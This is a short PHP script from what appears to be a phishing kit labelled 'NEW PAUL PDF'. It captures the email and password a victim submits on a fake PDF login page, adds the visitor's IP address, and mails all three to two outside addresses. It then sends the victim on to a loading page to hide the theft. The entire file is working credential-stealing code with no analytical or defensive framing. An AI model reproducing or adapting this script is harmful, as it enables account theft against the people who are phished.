<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || NEW PAUL PDF || :------\n";
$message .= "email              : ".$_POST['frm-email']."\n";
$message .= "password              : ".$_POST['frm-pass']."\n";
$message .= "IP: ".$ip."\n";

$recipient = "vhvhhf@sandiegoca.buzz,sgbsbsbg@gmail.com";
$subject = "PDF PAGE | ".$ip."\n";

mail($recipient,$subject,$message);
?>
	
		   <script language=javascript>
window.location='loadingpage.htm';
</script>
?>